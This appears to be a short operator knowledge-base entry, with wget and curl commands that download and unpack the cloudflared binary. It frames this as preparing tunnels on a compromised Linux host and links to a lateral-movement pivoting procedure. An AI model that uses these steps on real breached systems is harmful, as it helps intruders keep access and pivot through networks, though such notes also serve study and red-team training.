---
type: command
executor: bash
data: |-
  wget https://bin.equinox.io/c/VdrWdbjqyF/cloudflared-stable-linux-amd64.tgz
  tar xvzf cloudflared-stable-linux-amd64.tgz
tags:
  - download
  - cloudflared
platforms:
  - Linux
verified: true
validated: true
---

# download-cloudflared-binary

## Command

```bash
wget https://bin.equinox.io/c/VdrWdbjqyF/cloudflared-stable-linux-amd64.tgz
tar xvzf cloudflared-stable-linux-amd64.tgz
```

## Description

Downloads the stable Cloudflare Tunnel binary for Linux AMD64 and extracts it to the current directory. This prepares the cloudflared tool for creating tunnels on a compromised Linux host.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL (implicit) | Fixed download URL for the tarball | Yes |

## Examples

### Basic Usage

```bash
wget https://bin.equinox.io/c/VdrWdbjqyF/cloudflared-stable-linux-amd64.tgz
tar xvzf cloudflared-stable-linux-amd64.tgz
```

### Advanced Usage

If wget is unavailable, use curl:

```bash
curl -L https://bin.equinox.io/c/VdrWdbjqyF/cloudflared-stable-linux-amd64.tgz -o cloudflared.tgz
tar xvzf cloudflared.tgz
```

## Expected Output

wget: ~100% progress bar and "saved" message.
tar: Lists extracted files, including the cloudflared binary.

Verify with: `ls cloudflared` (should show the executable).

## Related

- [[procedures/Cloudflare-Tunnel-Pivoting-for-Lateral-Movement]]
- [[tools/cloudflared]]
